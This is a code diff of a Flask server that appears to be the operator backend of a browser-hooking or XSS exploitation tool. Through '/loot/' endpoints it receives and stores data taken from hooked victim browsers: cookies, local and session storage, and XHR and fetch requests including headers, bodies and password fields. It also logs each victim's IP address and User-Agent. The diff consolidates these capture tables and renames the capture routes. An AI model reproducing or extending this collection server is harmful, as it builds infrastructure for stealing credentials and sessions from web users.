@@ -371,46 +371,7 @@ class SessionStorage(Base):
         return f'<SessionStorage {self.id}>'
 
 
-class XhrOpen(Base):
-    __tablename__ = 'xhropen'
 
-    id        = Column(Integer, primary_key=True)
-    clientID  = Column(String(100), nullable=False)
-    method    = Column(String(100), nullable=False)
-    url       = Column(Text, nullable=False)
-    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
-
-    def __repr__(self):
-        return f'<XhrOpen {self.id}>'
-
-
-class XhrSetHeader(Base):
-    __tablename__ = 'xhrsetheader'
-
-    id        = Column(Integer, primary_key=True)
-    clientID  = Column(String(100), nullable=False)
-    header    = Column(Text, nullable=False)
-    value     = Column(Text, nullable=False)
-    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
-
-    def __repr__(self):
-        return f'<XhrSetHeader {self.id}>'
-
-
-class XhrCall(Base):
-    __tablename__ = 'xhrcall'
-
-    id           = Column(Integer, primary_key=True)
-    clientID     = Column(String(100), nullable=False)
-    requestBody  = Column(Text, nullable=True)
-    responseBody = Column(Text, nullable=True)
-    timeStamp    = Column(DateTime(timezone=True), server_default=func.now())
-
-    def __repr__(self):
-        return f'<XhrCall {self.id}>'
-
-
-# For refactor
 class XhrApiCall(Base):
     __tablename__ = 'xhrapicall'
 
@@ -429,7 +390,8 @@ class XhrApiCall(Base):
     def __repr__(self):
         return f'<XhrApiCall {self.id}>'
 
-# For refactor
+
+
 class XhrHeader(Base):
     __tablename__ = 'xhrheader'
 
@@ -444,7 +406,7 @@ class XhrHeader(Base):
         return f'<XhrHeader {self.id}>'
 
 
-# For refactor
+
 class FetchApiCall(Base):
     __tablename__ = 'fetchapicall'
 
@@ -461,7 +423,7 @@ class FetchApiCall(Base):
         return f'<FetchApiCall {self.id}>'
 
 
-# For refactor
+
 class FetchHeader(Base):
     __tablename__ = 'fetchheader'
 
@@ -475,46 +437,6 @@ class FetchHeader(Base):
     def __repr__(self):
         return f'<FetchHeader {self.id}>'
 
-
-
-
-class FetchSetup(Base):
-    __tablename__ = 'fetchsetup'
-
-    id        = Column(Integer, primary_key=True)
-    clientID  = Column(String(100), nullable=False)
-    method    = Column(String(100), nullable=False)
-    url       = Column(Text, nullable=False)
-    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
-
-    def __repr__(self):
-        return f'<FetchSetup {self.id}>'
-
-
-class FetchSetHeader(Base):
-    __tablename__ = 'fetchsetheader'
-
-    id        = Column(Integer, primary_key=True)
-    clientID  = Column(String(100), nullable=False)
-    header    = Column(Text, nullable=False)
-    value     = Column(Text, nullable=False)
-    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
-
-    def __repr__(self):
-        return f'<FetchSetHeader {self.id}>'
-
-
-class FetchCall(Base):
-    __tablename__ = 'fetchcall'
-
-    id           = Column(Integer, primary_key=True)
-    clientID     = Column(String(100), nullable=False)
-    requestBody  = Column(Text, nullable=True)
-    responseBody = Column(Text, nullable=True)
-    timeStamp    = Column(DateTime(timezone=True), server_default=func.now())
-
-    def __repr__(self):
-        return f'<FetchCall {self.id}>'
 
 
 
@@ -875,16 +797,10 @@ try:
                     Cookie.__table__.drop(engine)
                     LocalStorage.__table__.drop(engine)
                     SessionStorage.__table__.drop(engine)
-                    XhrOpen.__table__.drop(engine)
-                    XhrSetHeader.__table__.drop(engine)
-                    XhrCall.__table__.drop(engine)
                     XhrApiCall.__table__.drop(engine)
                     XhrHeader.__table__.drop(engine)
                     FetchApiCall.__table__.drop(engine)
                     FetchHeader.__table__.drop(engine)
-                    FetchSetup.__table__.drop(engine)
-                    FetchSetHeader.__table__.drop(engine)
-                    FetchCall.__table__.drop(engine)
                     Event.__table__.drop(engine)
                     FormPost.__table__.drop(engine)
                     CustomExfil.__table__.drop(engine)
@@ -1482,118 +1398,12 @@ def recordSessionStorageEntry(identifier):
 
 
 
-# Record XHR API Open calls
-@app.route('/loot/xhrOpen/<identifier>', methods=['POST'])
-def recordXhrOpen(identifier):
-    if not isClientSessionValid(identifier):
-        return "No.", 401
-
-    # logger.info("## Recording XHR open event")
-    content = request.json 
-    method  = content['method']
-    url     = content['url']
-
-    # Put it in the database
-    newXhrOpen = XhrOpen(clientID=identifier, method=method, url=url)
-    db_session.add(newXhrOpen)
-
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
-
-    clientSeen(identifier, ip, request.headers.get('User-Agent'))
-    dbCommit()
-
-    # add to global event table
-    db_session.refresh(newXhrOpen)
-    newEvent = Event(clientID=identifier, timeStamp=newXhrOpen.timeStamp, 
-    eventType='XHROPEN', eventID=newXhrOpen.id)
-    db_session.add(newEvent)
-    dbCommit()    
-
-    return "ok", 200
-
-
-
-# Record XHR API Header calls
-@app.route('/loot/xhrSetHeader/<identifier>', methods=['POST'])
-def recordXhrHeader(identifier):
-    if not isClientSessionValid(identifier):
-        return "No.", 401
-
-    # logger.info("## Recording XHR Header event")
-    content = request.json 
-    header  = content['header']
-    value   = content['value']
-
-    # Put it in the database
-    newXhrHeader = XhrSetHeader(clientID=identifier, header=header, value=value)
-    db_session.add(newXhrHeader)
-
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
-
-    clientSeen(identifier, ip, request.headers.get('User-Agent'))
-    dbCommit()
-
-    # add to global event table
-    db_session.refresh(newXhrHeader)
-    newEvent  = Event(clientID=identifier, timeStamp=newXhrHeader.timeStamp, 
-    eventType ='XHRSETHEADER', eventID=newXhrHeader.id)
-    db_session.add(newEvent)
-    dbCommit()    
-
-    return "ok", 200
-
-
-
-# Record XHR API calls
-@app.route('/loot/xhrCall/<identifier>', methods=['POST'])
-def recordXhrCall(identifier):
-    if not isClientSessionValid(identifier):
-        return "No.", 401
-
-    # logger.info("## Recording XHR api call")
-    content      = request.json 
-    requestBody  = content['requestBody']
-    responseBody = content['responseBody']
-
-    # Put it in the database
-    newXhrCall = XhrCall(clientID=identifier, requestBody=requestBody, responseBody=responseBody)
-    db_session.add(newXhrCall)
-
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
-
-    clientSeen(identifier, ip, request.headers.get('User-Agent'))
-    dbCommit()
-
-    # add to global event table
-    db_session.refresh(newXhrCall)
-    newEvent  = Event(clientID=identifier, timeStamp=newXhrCall.timeStamp, 
-    eventType ='XHRCALL', eventID=newXhrCall.id)
-    db_session.add(newEvent)
-    dbCommit()    
-
-    return "ok", 200
-
-
-
-
 
 # Dump the full XHR api call info
-@app.route('/loot/xhrRequestDump/<identifier>', methods=['POST'])
+@app.route('/loot/xhrRequest/<identifier>', methods=['POST'])
 def recordXhrDump(identifier):
     if not isClientSessionValid(identifier):
         return "No.", 401
-
-    print("Got XHR dump: ")
-    print(request.json)
 
     content        = request.json
     method         = content.get('method')
@@ -1634,13 +1444,10 @@ def recordXhrDump(identifier):
 
 
 # Dump the full Fetch api call info
-@app.route('/loot/fetchRequestDump/<identifier>', methods=['POST'])
+@app.route('/loot/fetchRequest/<identifier>', methods=['POST'])
 def recordFetchDump(identifier):
     if not isClientSessionValid(identifier):
         return "No.", 401
-
-    print("Got Fetch dump: ")
-    print(request.json)
 
     content        = request.json
     method         = content.get('method')
@@ -1675,110 +1482,6 @@ def recordFetchDump(identifier):
 
     return "ok", 200   
 
-
-
-
-
-# Record Fetch API Setup
-@app.route('/loot/fetchSetup/<identifier>', methods=['POST'])
-def recordFetchSetup(identifier):
-    if not isClientSessionValid(identifier):
-        return "No.", 401
-
-    # logger.info("## Recording Fetch setup event")
-    content = request.json 
-    method  = content['method']
-    url     = content['url']
-
-    # Put it in the database
-    newFetchSetup = FetchSetup(clientID=identifier, method=method, url=url)
-    db_session.add(newFetchSetup)
-
-
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
-
-    clientSeen(identifier, ip, request.headers.get('User-Agent'))
-    dbCommit()
-
-    # add to global event table
-    db_session.refresh(newFetchSetup)
-    newEvent  = Event(clientID=identifier, timeStamp=newFetchSetup.timeStamp, 
-    eventType ='FETCHSETUP', eventID=newFetchSetup.id)
-    db_session.add(newEvent)
-    dbCommit()    
-
-    return "ok", 200
-
-
-
-# Record Fetch API Header calls
-@app.route('/loot/fetchHeader/<identifier>', methods=['POST'])
-def recordFetchHeader(identifier):
-    if not isClientSessionValid(identifier):
-        return "No.", 401
-
-    # logger.info("## Recording Fetch Header event")
-    content = request.json 
-    header  = content['header']
-    value   = content['value']
-
-    # Put it in the database
-    newFetchHeader = FetchSetHeader(clientID=identifier, header=header, value=value)
-    db_session.add(newFetchHeader)
-
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
-
-    clientSeen(identifier, ip, request.headers.get('User-Agent'))
-    dbCommit()
-
-    # add to global event table
-    db_session.refresh(newFetchHeader)
-    newEvent  = Event(clientID=identifier, timeStamp=newFetchHeader.timeStamp, 
-    eventType ='FETCHHEADER', eventID=newFetchHeader.id)
-    db_session.add(newEvent)
-    dbCommit()    
-
-    return "ok", 200
-
-
-# Record Fetch API calls
-@app.route('/loot/fetchCall/<identifier>', methods=['POST'])
-def recordFetchCall(identifier):
-    if not isClientSessionValid(identifier):
-        return "No.", 401
-
-    # logger.info("## Recording Fetch api call")
-    content      = request.json 
-    requestBody  = content['requestBody']
-    responseBody = content['responseBody']
-
-    # Put it in the database
-    newFetchCall = FetchCall(clientID=identifier, requestBody=requestBody, responseBody=responseBody)
-    db_session.add(newFetchCall)
-
-
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
-
-    clientSeen(identifier, ip, request.headers.get('User-Agent'))
-    dbCommit()
-
-    # add to global event table
-    db_session.refresh(newFetchCall)
-    newEvent  = Event(clientID=identifier, timeStamp=newFetchCall.timeStamp, 
-    eventType ='FETCHCALL', eventID=newFetchCall.id)
-    db_session.add(newEvent)
-    dbCommit()    
-
-    return "ok", 200
 
 
 
@@ -1989,41 +1692,7 @@ def getClientSesssionStorage(key):
     return jsonify(sessionStorageData)
 
 
-@app.route('/api/clientXhrOpen/<key>', methods=['GET'])
-@login_required
-def getClientXhrOpen(key):
-    # logger.info("**** Fetching client xhr api open call...")
-    xhrOpen = XhrOpen.query.filter_by(id=key).first()
-
-    xhrOpenData = {'method':escape(xhrOpen.method), 'url':escape(xhrOpen.url)}
-
-    return jsonify(xhrOpenData)
  
- 
-@app.route('/api/clientXhrSetHeader/<key>', methods=['GET'])
-@login_required
-def getClientXhrSetHeader(key):
-    # logger.info("**** Fetching client xhr api set header call...")
-    xhrSetHeader = XhrSetHeader.query.filter_by(id=key).first()
-
-    xhrHeaderData = {'header':escape(xhrSetHeader.header), 'value':escape(xhrSetHeader.value)}
-
-    return jsonify(xhrHeaderData)
-
-
-
-@app.route('/api/clientXhrCall/<key>', methods=['GET'])
-@login_required
-def getClientXhrCall(key):
-    # logger.info("**** Fetching client xhr api call...")
-    xhrCall = XhrCall.query.filter_by(id=key).first()
-
-    xhrCallData = {'requestBody':xhrCall.requestBody, 'responseBody':xhrCall.responseBody}
-
-    return jsonify(xhrCallData)
-
-
-
 
 
 @app.route('/api/clientXhrApiCall/<key>', methods=['GET'])
@@ -2044,13 +1713,26 @@ def getClientXhrApiCall(key):
         'asyncRequest': escape(xhrApiCall.asyncRequest),
         'user': escape(xhrApiCall.user),
         'password': escape(xhrApiCall.password),
-        'requestBody': xhrApiCall.requestBody, # escape client side after b64 decode
-        'responseBody': xhrApiCall.responseBody, # escape client side after b64 decode
         'responseStatus': escape(xhrApiCall.responseStatus),
         'headers': headers_list
     }
 
     return jsonify(xhrCallData)
+
+
+
+
+
+@app.route('/api/clientXhrCall/<key>', methods=['GET'])
+@login_required
+def getClientXhrCall(key):
+    # logger.info("**** Fetching client xhr api call...")
+    xhrCall = XhrApiCall.query.filter_by(id=key).first()
+
+    xhrCallData = {'requestBody':xhrCall.requestBody, 'responseBody':xhrCall.responseBody}
+
+    return jsonify(xhrCallData)
+
 
 
 
@@ -2071,8 +1753,6 @@ def getClientFetchApiCall(key):
     fetchCallData = {
         'method': escape(fetchApiCall.method),
         'url': escape(fetchApiCall.url),
-        'requestBody': fetchApiCall.requestBody, # escape client side after b64 decode
-        'responseBody': fetchApiCall.responseBody, # escape client side after b64 decode
         'responseStatus': escape(fetchApiCall.responseStatus),
         'headers': headers_list
     }
@@ -2082,37 +1762,11 @@ def getClientFetchApiCall(key):
 
 
 
-
-
-@app.route('/api/clientFetchSetup/<key>', methods=['GET'])
-@login_required
-def getClientFetchSetup(key):
-    # logger.info("**** Fetching client fetch setup call...")
-    fetchSetup = FetchSetup.query.filter_by(id=key).first()
-
-    fetchSetupData = {'method':escape(fetchSetup.method), 'url':escape(fetchSetup.url)}
-
-    return jsonify(fetchSetupData)
-
-
-
-@app.route('/api/clientFetchHeader/<key>', methods=['GET'])
-@login_required
-def getClientFetchHeader(key):
-    # logger.info("**** Fetching client fetch api header call...")
-    fetchHeader = FetchSetHeader.query.filter_by(id=key).first()
-
-    fetchHeaderData = {'header':escape(fetchHeader.header), 'value':escape(fetchHeader.value)}
-
-    return jsonify(fetchHeaderData)
-
-
-
 @app.route('/api/clientFetchCall/<key>', methods=['GET'])
 @login_required
 def getClientFetchCall(key):
     # logger.info("**** Fetching client xhr api call...")
-    fetchCall = FetchCall.query.filter_by(id=key).first()
+    fetchCall = FetchApiCall.query.filter_by(id=key).first()
 
     fetchCallData = {'requestBody':fetchCall.requestBody, 'responseBody':fetchCall.responseBody}
 
